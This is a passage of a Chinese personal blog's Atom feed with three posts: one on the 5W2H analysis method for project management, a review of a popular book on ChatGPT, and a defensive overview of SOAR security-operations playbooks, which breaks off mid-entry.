<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XieJava&#39;s blog</title>
  
  <subtitle>记录最好的自己</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://xiejava.gitee.io/"/>
  <updated>2023-11-04T03:25:23.594Z</updated>
  <id>https://xiejava.gitee.io/</id>
  
  <author>
    <name>XieJava</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>5W2H分析法：全面思考和解决问题的实用工具</title>
    <link href="https://xiejava.gitee.io/posts/a9725cba/"/>
    <id>https://xiejava.gitee.io/posts/a9725cba/</id>
    <published>2023-11-04T02:45:33.000Z</published>
    <updated>2023-11-04T03:25:23.594Z</updated>
    
    <content type="html"><![CDATA[<p>5W2H分析法又叫七问分析法，创于二战中美国陆军兵器修理部。发明者用五个以W开头的英语单词和两个以H开头的英语单词进行设问，发现解决问题的线索，寻找发明思路，进行设计构思，从而搞出新的发明项目。5W2H简单、方便，易于理解，实用，富有启发意义，广泛用于企业管理和技术活动，对于决策和执行性的活动措施也非常有帮助，也有助于弥补考虑问题的疏漏。</p><p>这种方法的核心思想是将问题或任务分解为七个关键方面的问题，以确保全面思考和计划。下面是这些关键方面的解释：<br>1.<strong>What (做什么)</strong>: 这个问题涉及明确任务或目标的性质，需要完成什么工作。它帮助定义任务的本质。<br>2.<strong>Why (为什么)</strong>: 这个问题涉及理解为什么需要完成这项任务或目标，它的动机和目的是什么。它帮助明确任务的意义和价值。<br>3.<strong>Who (何人做)</strong>: 这个问题涉及确定谁将执行任务或项目，涉及到相关的利益相关者或责任人。<br>4.<strong>When (何时做)</strong>: 这个问题涉及确定任务或项目的时间表，包括起始时间、截止时间和任何关键时间点。<br>5.<strong>Where (何处做)</strong>: 这个问题涉及确定任务或项目在哪里完成，涉及到地点或地理位置。<br>6.<strong>How (怎么做)</strong>: 这个问题涉及确定任务或项目如何完成，包括所需的方法、工具和流程。<br>7.<strong>How much (多少)</strong>: 这个问题涉及确定任务或项目的成本、资源需求和预算。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231104/5W2H.png" alt="5W2H"></p><p>5W2H分析法被广泛用于项目管理、决策分析、计划制定以及解决各种实际问题。这个方法有助于组织和个人更好地理解任务的各个方面，并有效地进行规划和执行。同时，5W2H分析法也可以应用于个人工作和生活中，帮助人们更好地解决问题和做出决策。<br>在项目管理中，5W2H分析法可以应用于以下几个方面：</p><p>1.项目计划制定：在项目计划制定阶段，可以使用5W2H分析法来确保计划的全面性和具体性。例如，可以回答以下问题：</p><ul><li>What：项目的目标是什么？需要完成哪些任务？</li><li>When：项目的周期是什么？每个阶段的时间节点是什么？</li><li>Where：项目实施的地点在哪里？需要哪些资源？</li><li>Who：谁来负责项目的实施？需要哪些人员和团队？</li><li>Why：为什么需要实施这个项目？它的意义和目的是什么？</li><li>How：如何实施这个项目？需要采取哪些方法和措施？</li><li>How much：项目的预算是多少？需要投入哪些资源和成本？</li></ul><p>2.项目问题诊断与解决：在项目实施过程中，可以使用5W2H分析法来诊断和解决遇到的问题。例如，可以回答以下问题：</p><ul><li>What：问题的具体内容是什么？对项目的影响是什么？</li><li>When：问题发生的时间是什么时候？影响了哪些阶段的任务？</li><li>Where：问题发生的地点在哪里？影响了哪些区域的工作？</li><li>Who：谁来负责解决问题？需要哪些人员的支持和协助？</li><li>Why：为什么会出现这个问题？根源是什么？</li><li>How：如何解决问题？需要采取哪些措施和方法？</li><li>How much：解决问题需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>3.项目决策支持：在项目实施过程中，可以使用5W2H分析法来评估各种选项的优缺点，为决策提供支持。例如，可以回答以下问题：</p><ul><li>What：决策的具体内容是什么？对项目的影响是什么？</li><li>When：决策的时机是什么时候？需要在哪个阶段做出决定？</li><li>Where：决策的地点在哪里？需要在哪个区域进行讨论和决策？</li><li>Who：谁来负责做出决策？需要哪些人员的支持和协助？</li><li>Why：为什么需要做出这个决策？对项目的意义和目的是什么？</li><li>How：如何做出决策？需要采取哪些方法和程序？</li><li>How much：决策需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>4.项目风险评估：在项目实施过程中，可以使用5W2H分析法来识别和分析潜在的风险，以及制定相应的应对措施。例如，可以回答以下问题：</p><ul><li>What：潜在的风险是什么？对项目的影响是什么？</li><li>When：风险可能发生的时间是什么时候？需要在哪个阶段进行预警和应对？</li><li>Where：风险可能发生的地点在哪里？需要在哪个区域进行防范和控制？</li><li>Who：谁来负责识别和分析风险？需要哪些人员的支持和协助？</li><li>Why：为什么会出现这个风险？根源是什么？</li><li>How：如何应对这个风险？需要采取哪些措施和方法？</li><li>How much：应对风险需要投入多少资源和成本？对项目预算的影响是什么？</li></ul><p>5.项目总结与经验教训总结：在项目完成后，可以使用5W2H分析法来总结项目的经验和教训，为今后的项目提供参考。例如，可以回答以下问题：</p><ul><li>What：项目的目标和成果是什么？有哪些关键的阶段和任务？</li><li>When：项目的时间轴是怎样的？有哪些重要的时间节点和里程碑事件？</li><li>Where：项目的实施地点是怎样的？有哪些关键的区域和工作场所？</li><li>Who：谁参与了项目的实施？有哪些人员和团队做出了重要贡献或产生了影响？</li><li>Why：为什么项目能够成功或失败？有哪些关键因素或原因导致了这个结果？</li></ul><p>5W2H分析法在个人工作中的应用场景也是非常广泛的，例如：</p><ol><li>制定个人计划：在制定个人计划时，可以使用5W2H分析法来确保计划更加全面和具体，包括设定目标、分解任务、安排时间、评估资源、确定人员和评估成本等。</li><li>解决问题：在解决问题时，可以使用5W2H分析法来分析问题的各个方面，包括问题的原因、影响、解决方案、实施步骤和资源需求等。</li><li>做出决策：在做出决策时，可以使用5W2H分析法来评估各种选项的优缺点，包括选项的可行性、可靠性、经济性、社会效益和风险等。</li><li>项目管理：在项目管理中，可以使用5W2H分析法来制定项目计划、安排任务、协调资源、控制进度和评估质量等。</li><li>个人时间管理：在个人时间管理中，可以使用5W2H分析法来规划时间表、安排工作优先级、合理分配时间和评估工作效果等。</li></ol><p>5W2H分析方法在实际生活中有很多应用例子，以下是其中两小个例子：</p><p>1.计划一次周末旅行：</p><ul><li>Why 为了放松身心，增加生活体验，提升生活质量。</li><li>What 去一个风景优美的地方，欣赏自然风光，享受户外活动。</li><li>Where 选择一个适合户外活动的旅游目的地，例如山区、海滩或森林。</li><li>When 选择一个周末，安排好出发时间和返回时间。</li><li>Who 和家人或朋友一起去，共同体验旅行的乐趣。</li><li>How 制定详细的旅行计划，包括交通方式、住宿、餐饮和活动安排。</li><li>How much 预算合理的旅行费用，包括交通费、住宿费、餐饮费和活动费用。</li></ul><p>2.计划一次家庭装修：</p><ul><li>Why 为了提升家庭的生活品质和舒适度，改善家庭环境。</li><li>What 进行一次全面的家庭装修，包括水电改造、墙面地面装修、家具购置等。</li><li>Where 在家庭内进行装修，可能涉及多个房间和公共区域。</li><li>When 选择一个合适的时间段进行装修，例如假期或周末，合理安排工期。</li><li>Who 雇佣专业的装修公司或施工队伍进行装修，自己负责监督和协调。</li><li>How 制定详细的装修计划，包括材料采购、施工流程、装修风格和家具购置等。</li><li>How much 预算合理的装修费用，包括材料费、人工费、家具购置费等。</li></ul><p>总之，5W2H分析法可以帮助个人在工作和生活中更加全面地思考问题，制定更加具体和可行的计划或决策，提高工作效率和质量。</p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;5W2H分析法又叫七问分析法，创于二战中美国陆军兵器修理部。发明者用五个以W开头的英语单词和两个以H开头的英语单词进行设问，发现解决问题的线索，寻找发明思路，进行设计构思，从而搞出新的发明项目。5W2H简单、方便，易于理解，实用，富有启发意义，广泛用于企业管理和技术活动，对
      
    
    </summary>
    
    
      <category term="管理" scheme="https://xiejava.gitee.io/categories/%E7%AE%A1%E7%90%86/"/>
    
      <category term="项目管理" scheme="https://xiejava.gitee.io/categories/%E7%AE%A1%E7%90%86/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
    
      <category term="项目管理" scheme="https://xiejava.gitee.io/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"/>
    
      <category term="学习方法" scheme="https://xiejava.gitee.io/tags/%E5%AD%A6%E4%B9%A0%E6%96%B9%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>拥抱AI-ChatGPT:人类新纪元</title>
    <link href="https://xiejava.gitee.io/posts/5ce9b0c0/"/>
    <id>https://xiejava.gitee.io/posts/5ce9b0c0/</id>
    <published>2023-10-28T08:10:01.000Z</published>
    <updated>2023-10-28T08:22:50.273Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPTlogo.png" alt="ChatGPT"></p><p>最近大模型通用智能应用持续发酵，各大科技公司都陆续推出了基于通用大模型的智能应用产品，典型的如OpenAI的ChatGPT、微软的BingChat、百度的文心一言、360的智脑、阿里的通义千问等。当然最火的要属于ChatGPT了，从去年年底推出到现在已经有很多人体验了，并惊叹于如今的人工智能已经发展到无所不知、无所不能的程度了。</p><p>市面上推出了很多介绍ChatGPT的书，覆盖了包括使用指南、原理说明、应用介绍等等各个方面。如果从一个以前从没了解过AI技术的小白想去初步了解ChatGPT不妨去看看《ChatGPT：人类新纪元》这本书。这本书是“搜狗输入法之父”，美团顾问，现任美团光年产品经理，被王兴称为“美团光年首席AGI布道师”马占凯马老师所著。虽然目前豆瓣评分6.8不算高，但是我个人认为作为ChatGPT的科普读物，包含了深入浅出的常识性的普及，以及对人工智能相关历史的概述和推演等，高度概括，其中还有很多有趣的故事，很好读，挺有价值的。这本书的定位就是科普，我觉得已经做到了。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT%E4%BA%BA%E7%B1%BB%E6%96%B0%E7%BA%AA%E5%85%83.png" alt="ChatGPT:人类新纪元"></p><p>经过一段时间对ChatGPT的使用，我逐步认同书中对“ChatGPT：人类新纪元”的提法。ChatGPT，如同人类历史上的单向门——火、文字、造纸、蒸汽机、电和计算机一样，ChatGPT的横空出世让大家看到了通用人工智能达到了崭新新的高度，标志着人类科技进步的又一重大里程碑，预示着我们正步入通用人工智能的新纪元。就像2007年乔布斯发布划时代的苹果智能手机iphone后，各种互联网移动应用蜂拥而至，大家再也离不开智能手机了，从此开始了移动互联的新纪元。</p><h2 id="一、ChatGPT之初体验"><a href="#一、ChatGPT之初体验" class="headerlink" title="一、ChatGPT之初体验"></a>一、ChatGPT之初体验</h2><p>对于一个码农，初接触ChatGPT时就想验证一下ChatGPT的编程功底，最近正好在研究用机器学习来识别心电图。如是问了一下ChatGPT如何用Python写一段心电图识别波形的代码。<br>看一下ChatGPT给我的答案：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT-%E4%BB%A3%E7%A0%81.png" alt="ChatGPT代码"></p><p>关键是这段代码稍作调整就可以运行起来。</p><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPT%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" alt="chatGPT代码运行结果"><br>看上去效果还不错！</p><p>这可不是向搜素引擎一样搜出一堆的结果给出一堆的选项让我来选，而是真正的根据我的题意自己生成了一段可以执行的代码！这就有点牛逼了。</p><p>原来一直以为码农毕竟还是干技术活的，不会像那些从事简单重复劳动的活一样被AI所替代。但是看到ChatGPT给我的答案，又更进一步的加深了我的焦虑。本来就很卷的IT行业，还要和通用人工智能卷，估计用不了多久码农这个职业就会要消失了。</p><h2 id="二、ChatGPT与搜索引擎"><a href="#二、ChatGPT与搜索引擎" class="headerlink" title="二、ChatGPT与搜索引擎"></a>二、ChatGPT与搜索引擎</h2><p>有人认为ChatGPT就是搜索引擎的升级版，输入一些信息机器就给你反馈一些经过精细过滤后的信息。ChatGPT与搜索引擎完全是两类不同的东西。差别就和智能手机与以前的功能手机一样大。</p><p>ChatGPT是通过海量的数据学习后，具备真正具有智能能力的，给出的内容是根据自身的学习自动生成的。也就是我们常说的生成式AI，是一种能够从其训练数据中学习并生成新的、类似的数据或模型的机器学习技术。这种方法不依赖于预先定义的规则或模式，而是通过自我学习和适应来改进其性能。</p><p>与传统的AI相比，生成式AI的主要区别在于其学习方式和能力。传统的AI通常依赖于专家知识或编程指令来执行特定的任务。例如，一个图像识别系统可能被训练成只识别特定的图像类型，如猫或狗。然而，一旦这个系统遇到它从未见过的图像，它就无法做出正确的判断。</p><p>相反，生成式AI可以通过自我学习和适应来提高其性能。即使它从未见过某种类型的数据，它也可以通过分析大量的类似数据来学习如何处理这种数据。例如，ChatGPT通过海量的数据学习可以自动生成给出符合题意的答案。</p><p>而搜索引擎甚至连传统的AI都算不上，只是通过大数据的搜索算法将符合搜索条件的信息查询后返回到你，你还要根据自己的判断去识别和删选有用的信息。尤其是有了竞价模型后，可能搜索引擎给你的数据排名前几的都是对你来说没有什么用的，只是出价高的几个。</p><h2 id="三、机器学习与人类学习"><a href="#三、机器学习与人类学习" class="headerlink" title="三、机器学习与人类学习"></a>三、机器学习与人类学习</h2><p>机器学习其实是和人类学习是一样的。基本原理如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B.png" alt="学习模型"></p><p>机器学习的输入是海量的数据，通过模型的训练从数据中学习，生成并输出新的数据，根据输出的效果的进行评估和反馈来调整模型参数使模型的学习效果达到最优。</p><p>人类学习也是一样的，平时我们努力大量的看书、看视频、看其他资料、与人交流，其实都是在获取信息，将信息输入至大脑后，大脑经过思考输出结果，结果是对世界的认知、对人生的看法、对专业知识的领悟、输出一篇论文、输出一次演讲等等。也是对自己输出的结果进行评估和反馈来强化学习效果。</p><p>比如：学生通过大量的阅读和做题作为输入来学习知识，通过考试来评估学习效果，根据考试评估的结果来调整自己的学习方法策略来取得更好的学习成绩。</p><p>我们也是一样的，要想提高自己的认知和能力，就要通过<strong>大量的阅读（输入）</strong>、<strong>思考（学习）</strong>、<strong>不断的反思（反馈评估）</strong>、不断的思考<strong>调整学习方法策略等（优化模型参数）</strong>，最终提高自身的能力，可以有高水平的<strong>认知输出（输出）</strong>。</p><h2 id="四、智能涌现与从量变到质变"><a href="#四、智能涌现与从量变到质变" class="headerlink" title="四、智能涌现与从量变到质变"></a>四、智能涌现与从量变到质变</h2><p>“智能涌现” 是一个涵盖广泛领域的概念，它描述了在复杂系统中，智能行为或性能如何从简单组件或个体之间的互动中产生或 “涌现” 出来。在机器学习中，神经网络和深度学习模型可以通过大量的神经元之间的互连来实现智能任务。</p><p>在ChatGPT惊人的智能表现背后，就发生了智能涌现的现象。涌现现象是极为复杂的，因为复杂性科学就是复杂的，复杂是其基本特征。通俗的将就是当数据和模型参数达到一定的数量级后模型涌现出了新的完成任务的能力。</p><p>目前，在大模型的智能涌现方面，有三个结论。<br>第一，我们不知道什么时候会涌现某种新能力；<br>第二，我们不知道到一定规模时会涌现哪一种新的能力。<br>第三，我们唯一知道的是，只要数据量足够大，训练得足够深，一定会有涌现发生。</p><p>于是，我不禁又要拿出这张图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/%E4%BB%8E%E9%87%8F%E5%8F%98%E5%88%B0%E8%B4%A8%E5%8F%98.png" alt="在这里插入图片描述"></p><p>这张图可以理解为从量变到质变的过程。在人类学习的过程中，学任何东西，如：学习英语，只要输入足够多通过<strong>大量的听说读写（数据量足够大）</strong>，<strong>投入的时间精力够多（训练得足够深）</strong>，一定会有拐点（涌现）发生，<strong>一定会成功</strong>，就像顿悟后开了挂一样。</p><p><strong>既然基于大模型的通用人工智能不可避免的来了，就让我们一起拥抱吧！</strong></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231028/ChatGPTlogo.png&quot; alt=&quot;ChatGPT&quot;&gt;&lt;/p&gt;
&lt;p&gt;最近大模型通用智能应用持续发酵，各大科技公
      
    
    </summary>
    
    
      <category term="读书" scheme="https://xiejava.gitee.io/categories/%E8%AF%BB%E4%B9%A6/"/>
    
    
      <category term="读后感" scheme="https://xiejava.gitee.io/tags/%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
    
      <category term="AI机器学习" scheme="https://xiejava.gitee.io/tags/AI%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>SOAR安全事件编排自动化响应-安全运营实战</title>
    <link href="https://xiejava.gitee.io/posts/30c4e5a0/"/>
    <id>https://xiejava.gitee.io/posts/30c4e5a0/</id>
    <published>2023-10-18T07:10:59.000Z</published>
    <updated>2023-10-18T09:36:58.951Z</updated>
    
    <content type="html"><![CDATA[<p>SOAR是最近几年安全市场上最火热的词汇之一。各个安全产商都先后推出了相应的产品，但大部分都用得不是很理想。SOAR不同与传统的安全设备，买来后实施部署就完事，SOAR是一个安全运营系统，是实现安全运营过程中人、工具、流程的有效协同，提高安全运营效率的平台。核心在于运营，在运营的过程中不断结合自身企业的安全情况，对接设备、优化剧本流程、制定相应的制度来发挥SOAR安全事件编排自动化响应系统的最大的效果。在安全运营实战过程中人员、工具、流程、制度一个都不能少。本文介绍如何通过SOAR安全事件编排自动化响应进行实战化的安全运营。</p><h2 id="一、企业安全运营的通点"><a href="#一、企业安全运营的通点" class="headerlink" title="一、企业安全运营的通点"></a>一、企业安全运营的通点</h2><p> <strong>1. 手段不足，事件响应时间长</strong><br>目前安全事件的处置常常需要涉及到不同部门、不同的安全设备之间的协同联动，依靠人工电话协同、邮件协同等手段，缺少统一的安全管理和自动化编排系统，不能将繁杂安全运行过程梳理为任务和剧本，把分散的安全工具与功能转化为可编程的应用和动作。人工方式协同事件长，效率低。</p><p> <strong>2. 单兵作战，安全运营效率低</strong><br>安全设备众多，多厂商多类型安全设备，无法有效的形成合力，每类设备都要有人单独的维护、监控、处置，无法形成合力。没有统一的运营系统，无法将团队、工具和流程的高度协同起来，覆盖安全运行的防护、检测、响应等各个环节，安全运营效率低。</p><p><strong>3. 人员匮乏,运营知识无积累</strong><br>安全运营往往借助于外部的安全运营支撑力量，尤其是重保期间过度依赖厂商资源，重保结束后并没有形成知识积累；另一方面由于安全运营人员匮乏，技能水平受困于重复性劳动难以提升，而优秀的工程师的经验也难以形成标准化的流程和动作。</p><h2 id="二、企业安全运营的目标"><a href="#二、企业安全运营的目标" class="headerlink" title="二、企业安全运营的目标"></a>二、企业安全运营的目标</h2><p>针对威胁事件及安全运营痛点问题，通过建设安全编排功能实现自动化响应处置能力，完成原来需要多人多系统多界面在线协同才能处置的安全任务，简化威胁管理难度，提升响应处置效率，保障应急处置质量。从防护、检测、响应、处置等维度，形成立体防护效果，提升网络安全自动化响应处置及统一作战指挥能力。</p><p><strong>1. 实现多场景剧本编排能力</strong><br>安全编排功能实现自动化响应处置，核心能力是要实现多场景的剧本灵活编排能力，通过可视化拖拽编排方式快速创建剧本，为安全处置提供上下文，避免传统运维要在不同页面间进行跳转切换，降低安全事件处置复杂度。剧本一旦创建成功启用，后续触发剧本的事件即可通过自动化方式进行处置，降低了不同部门间协同沟通、流程流转消耗的成本。解决现有安全事件处置依靠电话、邮件进行信息传递，依靠人工进行威胁处置慢的问题。</p><p><strong>2.具备灵活的设备对接能力</strong><br>打通告警、事件与安全处置设备之间已有的壁垒，消除异构环境下异构设备无法协同、联动的问题，提供标准化的处置派单接口，实现设备的处置联动。具备低代码开发和编排能力使安全设备快速的融入到剧本流程进行灵活调度。解决异构安全设备间集成、联动处置的问题，实现多源异构安全设备的联动处置能力提升。</p><p><strong>3. 基于实际运营的知识积累</strong><br>实现在安全运营过程的统一的数字化、标准化的安全运营管理流程，在实际的运营过程中将经验固化成剧本流程，以应对繁杂和重复的工作，降低安全事件处置管理成本，降低安全人员工作强度和工作经验能力等的高要求；记录安全事件数据，以可视化的形成评估处理结果，减少人员差异带来的不可控性，并减少对新安全运维分析人员的培训成本。</p><h2 id="三、SOAR的核心能力"><a href="#三、SOAR的核心能力" class="headerlink" title="三、SOAR的核心能力"></a>三、SOAR的核心能力</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/SOAR%E6%9E%B6%E6%9E%84.png" alt="SOAR整体架构"></p><p>安全事件处置通过安全编排与自动化响应SOAR模块实现，SOAR对接安全大数据分析引擎分析的产生的安全事件或其他如态势感知、日志系统等安全设备的安全事件，通过灵活的剧本编排实现自动的派发工单、自动化分析处置、联动设备响应，实现数据交互与业务同步，促进人、工具、流程的协同，进一步推动自动化安全运营能力落地。SOAR应该具备三大核心能力，编排、自动化、响应，参见<a href="https://blog.csdn.net/fullbug/article/details/121089374" target="_blank" rel="noopener">《认识SOAR-安全事件编排自动化响应》</a></p><h3 id="编排"><a href="#编排" class="headerlink" title="编排"></a>编排</h3><p>SOAR中的关键词是编排，这是在使用自动化和响应之前必须构建的关键组件。SOAR的编排体现的是一种协调和决策的能力，针对复杂性的安全事件，通过编排将分析过程中各种复杂性分析流程和处理平台进行组合。分析涉及多种数据或平台，如SIEM分析平台、漏洞管理平台、情报数据、资产数据等。处置响应的编排也涉及到很多平台或设备，如EDR管理平台、运维管理平台、工单管理平台、WAF设备、防火墙等。仅仅以技术为中心的安全保障已不再能满足现状，将人员和流程的编排才能保证安全流程真正高效的运行。SOAR的终极目标就是实现技术、流程、人员的无缝编排。</p><h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>SOAR的自动化体现在三个方面，面对需要处理的安全事件能够根据策略自动选择编排的剧本、自动执行剧本的操作流程、根据决策结果自动联动设备进行防护阻断等行动策略。它允许剧本（常称为Playbooks）在安全流程的部分或全部内容上执行多个任务，将线性剧本串联起来。虽然线性剧本可能更容易创建，但只适用于处理决策需求较少的工作流。编排和自动化比线性剧本的最大优势就是其灵活性，为支持全自动化和半自动化的决策，需要更加灵活的工作流和执行剧本。SOAR能够识别这些决策模式，并基于以往事件中的执行操作，自动推荐新事件的剧本、执行剧本操作流程，自动化分析决策，根据决策结果自动下发防护阻断的行动策略。</p><h3 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h3><p>安全事件响应包括告警管理、工单管理、案件管理等功能。告警管理的核心不仅是对告警安全事件的收集、展示和响应，更强调告警分诊和告警调查。只有通过告警分诊和告警调查才能提升告警的质量，减少告警的数量。工单管理适用于中大型的安全运维团队协同化、流程化地进行告警处置与响应，并且确保响应过程可记录、可度量、可考核。案件管理是现代安全事件响应管理的核心能力。案件管理帮助用户对一组相关的告警进行流程化、持续化的调查分析与响应处置，并不断积累该案件相关的痕迹物证 (IOC) 和攻击者的战技过程指标信息 (TTP)。多个案件并行执行，从而持续化地对一系列安全事件进行追踪处置。</p><h2 id="四、SOAR的安全运营实战"><a href="#四、SOAR的安全运营实战" class="headerlink" title="四、SOAR的安全运营实战"></a>四、SOAR的安全运营实战</h2><p>SOAR的安全运营实战，是通过编排好的安全剧本实现人员、流程、工具与知识的贯穿，实现跨区域、跨组织、跨业务、跨设备（系统）安全事件高效运营。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/SOAR%E6%B5%81%E7%A8%8B.png" alt="整体流程"></p><p>在HW及日常安全运营工作中，针对安全设备的统一监控处置、员工办公电脑的安全告警处置、HW重保安全事件处置等典型场景已得到充分实战化应用，通过安全事件的统一管理，从防护、检测、响应、处置等维度，提高了处置效率。可以在实际的安全运营过程中不断的丰富和优化剧本流程。有效支撑网络安全事件运营工作持续向前发展。</p><h3 id="场景1：员工电脑中毒安全事件场景"><a href="#场景1：员工电脑中毒安全事件场景" class="headerlink" title="场景1：员工电脑中毒安全事件场景"></a>场景1：员工电脑中毒安全事件场景</h3><p>员工电脑中毒安全事件主要是由员工办公终端电脑EDR检测出的病毒、木马后门等恶意软件，SOAR平台对EDR的告警数据进行统一的采集分析，形成场景化事件后通过SOAR进行告警通知，敦促员工对办公电脑进行杀毒处置。</p><ul><li>业务流程<br>该流程为自动化的流程，SOAR平台接收到员工中毒的安全事件信息后，自动发邮件或发短信通知员工，员工收到告警通知信息后对自己的办公终端电脑进行杀毒处理。如果三天内还没有处理，将继续发邮件或短信进行通知告警。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91%E4%B8%AD%E6%AF%92%E5%A4%84%E7%BD%AE%E6%B5%81%E7%A8%8B.png" alt="员工电脑中毒安全事件"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>企业员工</td><td>能够维护自己的办公终端电脑完成自己办公终端电脑的安全。</td><td>进行杀毒软件的安装、病毒库升级、杀毒扫描。</td></tr></tbody></table><h3 id="场景2：安全设备告警安全事件场景"><a href="#场景2：安全设备告警安全事件场景" class="headerlink" title="场景2：安全设备告警安全事件场景"></a>场景2：安全设备告警安全事件场景</h3><p>安全设备告警安全事件主要是由部署在网络环境下的主机安全检测设备、WAF、IPS、蜜罐等探针检测出的各类异常安全事件行为，SOC平台进行统一的采集、分析，最终形成场景化事件，进行派单处置的闭环管理。</p><ul><li>业务流程<br>1）一线监控人员发现在SOC平台上有触发的安全事件后，根据事件携带的原始安全日志信息进行初步研判分析；<br>2）如一线人员研判该事件为误报事件，则直接处置完成，同时记录事件相关的攻击特征值，进一步完善白名单；<br>3）如一线人员研判该事件为高风险事件，则将攻击IP地址报送至网络安全运营部安全员，由安全员进行IP地址封堵操作；<br>4）当网络安全运营部处置完毕后，通知一线监控人员结束该业务流程，最终形成闭环机制；<br>5）如一线人员无法研判该事件严重程度，则上升二线安全分析人员进行深入研判，二线安全分析人员将研判最终结果反馈至一线监控人员，再由一线监控人员根据实际情况选择下一步处置动作。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7%E5%89%A7%E6%9C%AC%E6%B5%81%E7%A8%8B.png" alt="安全事件监控处置"></p><ul><li>人员配置</li></ul><p>人员配置如下表所示：</p><table><thead><tr><th>序号</th><th>角色名称</th><th>所需技能</th><th>承担的工作内容</th></tr></thead><tbody><tr><td>1</td><td>安全监控员</td><td>能够初步判断安全事件影响范围及基本的应急处理措施</td><td>完成简单安全事件的处置工作，督促业务部门完成安全事件处置，做好安全事件处置的全流程管控</td></tr><tr><td>2</td><td>二线运营员</td><td>能够根据安全数据上下文判断安全事件的可信度及影响范围，能够利用各种手段开展攻击溯源及应急响应</td><td>完成复杂安全事件的研判工作，为一线监控人员提供技术指导</td></tr><tr><td>3</td><td>部门安全员</td><td>能够掌握本部门各业务系统层面、主机层面的应急流程和实际处置操作方法</td><td>配合完成IP地址封堵操作</td></tr></tbody></table><h3 id="场景3：重保HW安全事件处置场景"><a href="#场景3：重保HW安全事件处置场景" class="headerlink" title="场景3：重保HW安全事件处置场景"></a>场景3：重保HW安全事件处置场景</h3><p>重保HW安全事件主要是由包括WAF设备、VPN、蜜罐、EDR、全流量等各类安全设备检测出的对重点关注的重要靶标系统的各类攻击行为，SOAR平台对这些安全告警事件进行统一的采集、分析，最终形成场景化事件，通过SOAR进行派单调用相关的插件工具进行告警通知、资产判断、情报查询、IP封堵、协同相应的人员进行研判处置等的闭环管理。</p><ul><li>业务流程<br>1）监控人员发现安全事件后，根据事件携带的原始安全日志信息进行初步研判分析；<br>2）如研判组通过溯源研判该事件为误报事件，则直接处置完成，同时记录事件相关的攻击特征值，进一步完善白名单；<br>3）如研判组研判该事件为高风险事件，则转处置组进行处置，由处置人员进行确定通过插件自动化实现IP地址封堵操作；<br>4）处置组处置完成后进行封堵IP入库，避免被封堵IP的重复告警。</li></ul><p>具体实战剧本流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20231018/HW%E9%87%8D%E4%BF%9D%E5%AE%89%E5%85%A8%E5%A4%84%E7%BD%AE%E5%89%A7%E6%9C%AC%E6%B5%81%E7%A8%8B.png" 